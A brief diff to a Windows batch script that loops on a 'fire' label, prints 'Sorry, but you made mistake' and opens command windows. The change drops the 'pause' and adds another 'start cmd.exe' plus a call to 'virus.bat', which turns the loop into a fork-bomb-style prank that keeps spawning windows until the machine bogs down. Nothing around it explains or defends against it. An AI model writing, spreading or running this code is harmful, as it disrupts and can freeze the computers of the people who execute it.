@@ -5,5 +5,6 @@ goto fire
 color 2
 start cmd.exe
 echo "Sorry, but you made mistake..........."
-pause
+start cmd.exe
+virus.bat
 goto fire
